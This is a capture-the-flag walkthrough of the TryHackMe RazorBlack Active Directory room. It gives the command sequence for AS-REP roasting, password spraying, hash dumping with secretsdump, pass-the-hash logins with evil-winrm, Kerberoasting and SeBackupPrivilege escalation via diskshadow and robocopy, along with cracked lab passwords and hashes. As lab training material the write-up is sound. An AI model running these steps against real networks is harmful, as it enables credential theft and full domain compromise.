# 11 - AD - RazorBlack

Room Link --> [https://tryhackme.com/room/raz0rblack](https://tryhackme.com/room/raz0rblack)

### Enumeration

Nmap scan

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -p- -sS -sV $ip -T4 -v

# results
PORT STATE SERVICE
53/tcp open domain
88/tcp open kerberos-sec
111/tcp open rpcbind
135/tcp open msrpc
139/tcp open netbios-ssn
389/tcp open ldapsoft-ds
464/tcp open kpasswd5
593/tcp open http-rpc-epmap
636/tcp open ldapssl
2049/tcp open nfs
3268/tcp open globalcatLDAP
3269/tcp open globalcatLDAPssl
3389/tcp open ms-wbt-server
```
{% endcode %}

Smb couldn't be enumerater, so we used NFS.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# There is a /users NFS share.
showmount -e $ip

# make the dir to mount and mount the share.
mkdir /mnt/users
mount -t nfs 10.10.246.30:/users /mnt/users -o nolock

# there are 2 files in it:

daven port   : CTF PLAYER
imogen royce  : CTF PLAYER
tamara vidal  : CTF PLAYER
arthur edwards : CTF PLAYER
carl ingram  : CTF PLAYER (INACTIVE)
nolan cassidy  : CTF PLAYER
reza zaydan : CTF PLAYER
ljudmila vetrova  : CTF PLAYER, DEVELOPER,ACTIVE DIRECTORY ADMIN
rico delgado  : WEB SPECIALIST
tyson williams  : REVERSE ENGINEERING
steven bradley  : STEGO SPECIALIST
chamber lin  : CTF PLAYER(INACTIVE)

# The name of the txt file gives us the idea that the potential username could contain First letter of first name + Last name (Steven Bradley becomes sbradley). We now modified the entire list to "fNamelName" 
dport
iroyce
tvidal
aedwards
cingram
ncassidy
rzaydan
lvetrova
rdelgado
twilliams
sbradley
clin
```
{% endcode %}

Or we can use a tool called [_**generateADusernames**_](https://github.com/w0Tx/generate-ad-username) to change the names format from full name to AD username. For that we need to put the names and information in a file named `userinfo.txt`

{% code overflow="wrap" lineNumbers="true" %}
```bash
root@kali -> nano userinfo.txt

root@kali -> cat userinfo.txt | cut -d':' -f1 | tee user_fullnames.txt
daven port
imogen royce
tamara vidal
arthur edwards
carl ingram
nolan cassidy
reza zaydan
ljudmila vetrova
rico delgado
tyson williams
steven bradley
chamber lin

root@kali -> cat user_fullnames.txt | tr ' ' ',' | tee user_file.txt
daven,port,,,
imogen,royce,,
tamara,vidal,,
arthur,edwards,
carl,ingram,,
nolan,cassidy,,
reza,zaydan,
ljudmila,vetrova,,
rico,delgado,,
tyson,williams,,
steven,bradley,,
chamber,lin,,

root@kali -> python3 /opt/generate-ad-username/ADGenerator.py user_file.txt > users.txt
```
{% endcode %}

{% hint style="warning" %}
We could optionally use "kerbrute" to check for valid usernames from the list.

`kerbrute userenum -d raz0rblack.thm --dc 10.10.246.30 users.txt`
{% endhint %}

Since this looks like a list of valid usernames, we can try the **"ASREPRoasting"** attack.

{% code overflow="wrap" lineNumbers="true" %}
```bash
GetNPUsers.py raz0rblack.thm/ -usersfile user.txt -no-pass -dc-ip 10.10.227.117 -outputfile kerberos_users.txt

# results
```
{% endcode %}

<figure><img src=".gitbook/assets/image (74).png" alt=""><figcaption><p>2</p></figcaption></figure>

We got a user "twilliams", cracked his hash with "john".

<figure><img src=".gitbook/assets/image (75).png" alt=""><figcaption><p>3</p></figcaption></figure>

twilliams : roastpotatoes

We tested the creds to access the share, but there was nothing important.

{% code overflow="wrap" lineNumbers="true" %}
```bash
crackmapexec smb 10.10.227.117 -u twilliams -p 'roastpotatoes' --shares
```
{% endcode %}

<figure><img src=".gitbook/assets/image (76).png" alt=""><figcaption><p>4</p></figcaption></figure>

There is another folder with an interesting comment `trash` but we don't have permission to read it. We can brute force with **"Crackmapexec"** and see if any other user has the same password or not. So we create a "pass.txt" and put twiliams" password in it, then run it with crackmapexec.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# using crackmapexec for password spraying.
crackmapexec smb 10.10.227.117 -u user.txt -p pass.txt --continue-on-success

# using kerbrute for password spraying.
kerbrute passwordspray --dc 10.10.159.153 -d raz0rblack.thm users.txt 'roastpotatoes'
```
{% endcode %}

<figure><img src=".gitbook/assets/image (77).png" alt=""><figcaption><p>5</p></figcaption></figure>

We get a "STATUS\_PASSWORD\_MUST\_CHANGE" message for the user "sbradley", meaning we have to change password for this user. There are 2 tools we could use:

{% code overflow="wrap" lineNumbers="true" %}
```bash
smbpasswd -r 10.10.227.117 -U sbradley
# this worked form me.
smbpasswd.py  sbradley@10.10.227.117
```
{% endcode %}

<figure><img src=".gitbook/assets/image (78).png" alt=""><figcaption><p>6</p></figcaption></figure>

We can now access the trash" share as "sbradley"

{% code overflow="wrap" lineNumbers="true" %}
```bash
crackmapexec smb 10.10.227.117 -u sbradley -p 'Password123!' --shares
smbclient //10.10.140.231/trash -U sbradley
```
{% endcode %}

There are 3 files here.

{% hint style="danger" %}
I had to use Thunar file manager in kali to access the trash share and download the "experiment\_gone\_wrong.zip" file because it wont download through "smbclient" since it's too large.

In thunar file manager, enter: `smb://$ip/trash` - in the address bar, then authenticate.
{% endhint %}

{% code overflow="wrap" lineNumbers="true" %}
```bash
chat_log_20210222143423.txt         
experiment_gone_wrong.zip           
sbradley.txt

# The chat_log_20210222143423.txt has a Conversation between two staff. This gives us an insight on what to do to further exploit the machine.

# - cat chat_log_20210222143423.txt 
sbradley> Hey Administrator our machine has the newly disclosed vulnerability for Windows Server 2019.
Administrator> What vulnerability??
sbradley> That new CVE-2020-1472 which is called ZeroLogon has released a new PoC.
Administrator> I have given you the last warning. If you exploit this on this Domain Controller as you did previously on our old Ubuntu server with dirtycow, I swear I will kill your WinRM-Access.
sbradley> Hey you won't believe what I am seeing.
Administrator> Now, don't say that you ran the exploit.
sbradley> Yeah, The exploit works great it needs nothing like credentials. Just give it IP and domain name and it resets the Administrator pass to an empty hash.
sbradley> I also used some tools to extract ntds. dit and SYSTEM.hive and transferred it into my box. I love running secretsdump.py on those files and dumped the hash.
Administrator> I am feeling like a new cron has been issued in my body named heart attack which will be executed within the next minute.
Administrator> But, Before I die I will kill your WinRM access..........
sbradley> I have made an encrypted zip containing the ntds.dit and the SYSTEM.hive and uploaded the zip inside the trash share.
sbradley> Hey Administrator are you there ...
sbradley> Administrator .....
The administrator died after this incident.
Press F to pay respects
```
{% endcode %}

Cracking the .zip file, we can use "zip2john" or "fcrackzip"

{% code overflow="wrap" lineNumbers="true" %}
```bash
zip2john experiment_gone_wrong.zip > file
# or
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt experiment_gone_wrong.zip
```
{% endcode %}

<figure><img src=".gitbook/assets/image (79).png" alt=""><figcaption><p>7</p></figcaption></figure>

The password is `electromagnetismo` and with that I unzipped the file that contained 2 files named `sytem.hive` `ntds.dit` .&#x20;

<figure><img src=".gitbook/assets/image (80).png" alt=""><figcaption><p>8</p></figcaption></figure>

As mentioned in the conversation, we can use "secretsdump" to dump the hashes.

{% code overflow="wrap" lineNumbers="true" %}
```bash
secretsdump -ntds ntds.dit -system system.hive LOCAL | tee hash_dump.txt
```
{% endcode %}

We got a huge list of hashes.

### **Ljudmila’s Hash?**

After formating the list: `cat hash_dump.txt| cut -d ":" -f4 > clean_hashes.txt` - this will format the list and save only the NTHash part.

<figure><img src=".gitbook/assets/image (81).png" alt=""><figcaption><p>9</p></figcaption></figure>

We can use "crackmapexec" for pass the hash attack to discover "**Ljudmila’s Hash"**&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```bash
crackmapexec smb 10.10.90.215 -u lvetrova -H clean_hashes.txt
# we found the hash.
```
{% endcode %}

<figure><img src=".gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>10</p></figcaption></figure>

We use pass-the-hash attack with Evil-WinRm to login as "lvetrova"

{% code overflow="wrap" lineNumbers="true" %}
```bash
evil-winrm -i 10.10.90.215 -u lvetrova -H f220d3988deb3f516c73f40ee16c431d
```
{% endcode %}

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>11</p></figcaption></figure>

### Ljudmila's Flag

To get the flag, we saw a "lvetrova.xml" file containing the credentials. From the content it seems that it’s a xml representation of PSCredential Object. :

{% code overflow="wrap" lineNumbers="true" %}
```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Your Flag is here =&gt;</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009db56a0543f441469fc81aadb02945d20000000002000000000003660000c000000010000000069a026f82c590fa867556fe4495ca870000000004800000a0000000100000003b5bf64299ad06afde3fc9d6efe72d35500000002828ad79f53f3f38ceb3d8a8c41179a54dc94cab7b17ba52d0b9fc62dfd4a205f2bba2688e8e67e5cbc6d6584496d107b4307469b95eb3fdfd855abe27334a5fe32a8b35a3a0b6424081e14dc387902414000000e6e36273726b3c093bbbb4e976392a874772576d</SS>
    </Props>
  </Obj>
</Objs>
```
{% endcode %}

PowerShell has a method for storing encrypted credentials that can only be accessed by the user account that stored them. To retrieve the credential and using it within a script, you read it from the XML file. We will use this method to get the user’s hash

Reference --> [https://medium.com/@whoamihasin/powershell-credentials-for-pentesters-securestring-pscredentials-787263abf9d8](https://medium.com/@whoamihasin/powershell-credentials-for-pentesters-securestring-pscredentials-787263abf9d8)

{% code lineNumbers="true" %}
```powershell
$Credential = Import-Clixml -Path "lvetrova.xml"
$Credential.GetNetworkCredential().password
# we got the flag.
```
{% endcode %}

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>12</p></figcaption></figure>

### Xyan1d3's password?

The next step is **"Kerberoasting"** ie, using the Impacket's "GetUserSPN.py" to look for Service Accounts or users accounts with the SPN value set.

Normally we'd want to do a pass-the-hash, same way we got credentials for "lvetrova" hash, but there are almost 7000 hashes, that could be a deadend (obviously it is :( so Kerberoasting seem like the easy next step from here.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# Here we use the hashes for Lvetrova, since it is a valid cred.
GetUserSPNs.py raz0rblack.thm/lvetrova -hashes aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d -dc-ip 10.10.90.215 -request -outputfile kerberos_users.txt

# and we got Xyan1d3's hash.
```
{% endcode %}

<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>13</p></figcaption></figure>

We crack it with john.

<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>14</p></figcaption></figure>

xyan1d3 : cyanide9amine5628

### Xyan1d3's Flag

We login with Evil-winRM: `evil-winrm -i 10.10.90.215 -u xyan1d3 -p cyanide9amine5628` .

<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>15</p></figcaption></figure>

{% code overflow="wrap" lineNumbers="true" %}
```powershell
$Credential = Import-Clixml -Path "xyan1d3.xml"
$Credential.GetNetworkCredential().password
# we got the flag.
```
{% endcode %}

## Root Flag

This involves Privilege escalation.

<figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>16</p></figcaption></figure>

We check the Priviliges for the "Xyanld3.xml" user and we see we have both the "**SeBackupPrivilege**" and "**SeRestorePrivilege**" privileges.

### **SeBackupPrivilege Priv Esc**

{% hint style="success" %}
we will go over abusing the _**SeBackupPrivilege**_ to escalate on a Windows machine. This privilege provides users with full read permissions and the ability to create system backups. The full read access allows for reading any file on the machine, including the system-sensitive files like _**SAM, SYSTEM hives, or NTDS.dit**_.

An attacker can leverage this privilege to extract the hashes from these files and either crack them or pass them (PTH) to elevate their shell.

📌_In <mark style="color:red;">**workstations**</mark>, we need the **SAM and System hive files** to extract the hashes**,** while in <mark style="color:red;">domain controller machines</mark>, we need the **ntds.dit** file and **system hive** . Since we are in a Domain Controller._
{% endhint %}

Reference --> [Priv Esc using SeBackupPrivilege](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960)

There are couple of methods to leverage for this attack:

* **Shadow Copies with Diskshadow Utility + Robocopy**
* **Dynamic Link Library (DLLs) + Shadow Copies**
* **Wbadmin Utility**

#### Disk shadow + Robocopy <a href="#0193" id="0193"></a>

Diskshadow is a Windows built-in utility that can create copies of a drive that is currently in use.

Here is the script, we can run to get the files (save in a .txt file and upload to victim.)

Create a "C:\tmp" dir, put the file in there.

<pre class="language-bash" data-title="diskshadow.txt" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>set verbose onX
</strong><strong>set metadata C:\Windows\Temp\meta.cabX
</strong><strong>set context clientaccessibleX
</strong><strong>set context persistentX
</strong><strong>begin backupX
</strong><strong>add volume C: alias cdriveX
</strong><strong>createX
</strong><strong>expose %cdrive% E:X
</strong><strong>end backupX
</strong></code></pre>

We ass the script to **diskshadow utility** to create the shadow copy.

`diskshadow /s diskshadow.txt`

<figure><img src=".gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>17</p></figcaption></figure>

<figure><img src=".gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>18</p></figcaption></figure>

Successfully copied.

Switch to the _**E: Drive**_, copy the NTDS file using _**Robocopy**_ to the Temp file we created in the C: drive.

`cd E:`&#x20;

Switch back to the C:\tmp drive, and type this:

`robocopy /b E:\Windows\ntds . ntds.dit` .

<figure><img src=".gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption><p>19</p></figcaption></figure>

Next we get the system registry hive that contains the key needed to decrypt the NTDS file with _**reg save**_ command.

<pre><code><strong>reg save hklm\system c:\temp\system
</strong></code></pre>

\


<figure><img src=".gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption><p>20</p></figcaption></figure>

Successfully copied both required files, now send them to kali, and we can use "secretsdump.py" to dump the entire DC hash database.

Since we are in Evil-WinRM, we can use:

`download ntds.dit` and `download system` to download both files, this will take time :(

{% code overflow="wrap" lineNumbers="true" %}
```bash
secretsdump.py -system system -ntds ntds.dit LOCAL > dc_hashes.txt
```
{% endcode %}

<figure><img src=".gitbook/assets/image (11) (1) (1).png" alt=""><figcaption><p>21</p></figcaption></figure>

We got the admin hash. Now we can do pass-the-hash attack on the Admin account.

{% code overflow="wrap" lineNumbers="true" %}
```bash
evil-winrm -i 10.10.137.61 -u Administrator -H 9689931bed40ca5a2ce1218210177f0c
```
{% endcode %}

<figure><img src=".gitbook/assets/image (12) (1) (1).png" alt=""><figcaption><p>22</p></figcaption></figure>

There are 2 files in the Admin dir:

* The cookie.json is a base64, we used "base64 -d" to decode it. Nothing fancy.
* The "root.xml" was not like the other xml files, instead i put it in ChatGPT and it recognized it as "Hexadecimal", so i asked it to reverse it and BOOM! got the flag.

{% code title="root.xml" overflow="wrap" lineNumbers="true" %}
```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Administrator</S>
      <SS N="Password">44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a</SS>
  </Obj>
</Objs>
```
{% endcode %}

### Tyson's Flag

Just cd into "twilliams" folder. Found a funny .exe file.

<figure><img src=".gitbook/assets/image (13) (1) (1).png" alt=""><figcaption><p>23</p></figcaption></figure>

After moving through the directories we find a folder named `"C:\Program Files\Top Secret"`

There is an image in that folder. We can download it and analyze it for the flag.

It's pretty obvious by seeing the picture that the answer here is `:wq`

Done!
